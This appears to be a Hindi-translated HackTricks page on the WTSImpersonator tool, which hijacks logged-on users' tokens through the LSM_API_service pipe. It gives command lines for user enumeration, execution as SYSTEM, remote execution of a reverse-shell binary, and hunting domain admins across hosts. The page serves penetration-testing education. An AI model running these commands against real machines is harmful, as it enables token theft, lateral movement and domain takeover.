<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks को समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

The **WTS Impersonator** टूल **"\\pipe\LSM_API_service"** RPC Named pipe का शोषण करता है ताकि लॉग-इन उपयोगकर्ताओं की गणना कर सके और उनके टोकन को हाइजैक कर सके, पारंपरिक टोकन अनुकरण तकनीकों को छलकर बाहर निकलता है। यह दृष्टिकोण नेटवर्क के भीतर अद्भुत लटकती हरकतें सुनिश्चित करता है। इस तकनीक के पीछे इस तकनीक को **Omri Baso** को स्वामित्व दिया जाता है, जिनका काम [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।

### मूल कार्यक्षमता
यह उपकरण एक क्रमबद्ध API कॉल के माध्यम से काम करता है:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### मुख्य मॉड्यूल और उपयोग
- **उपयोक्ताओं की जांच**: उपकरण के साथ स्थानीय और दूरस्थ उपयोक्ता जांच संभव है, किसी भी स्थिति के लिए आदेश का उपयोग करके:
- स्थानीय रूप से:
```powershell
.\WTSImpersonator.exe -m enum
```
- दूरस्थ रूप से, एक आईपी पता या होस्टनाम को निर्दिष्ट करके:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **आदेशों का निष्पादन**: `exec` और `exec-remote` मॉड्यूल को कार्य करने के लिए एक **सेवा** संदर्भ की आवश्यकता होती है। स्थानीय निष्पादन केवल WTSImpersonator एक्जीक्यूटेबल और एक आदेश की आवश्यकता होती है:
- स्थानीय आदेश निष्पादन के लिए उदाहरण:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- सेवा संदर्भ प्राप्त करने के लिए PsExec64.exe का उपयोग किया जा सकता है:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **दूरस्थ आदेश निष्पादन**: PsExec.exe के समान दूरस्थ रूप से एक सेवा बनाना और स्थापित करना शामिल है, जिससे उचित अनुमतियों के साथ निष्पादन संभव हो।
- दूरस्थ निष्पादन का उदाहरण:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **उपयोक्ता हंटिंग मॉड्यूल**: कई मशीनों पर विशिष्ट उपयोक्ताओं को लक्ष्य बनाना, उनके परमिट के तहत कोड निष्पादित करना। यह स्थानीय व्यवस्थापक अधिकार वाले डोमेन व्यवस्थापकों को लक्ष्य बनाने के लिए विशेष रूप से उपयोगी है।
- उपयोग का उदाहरण:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
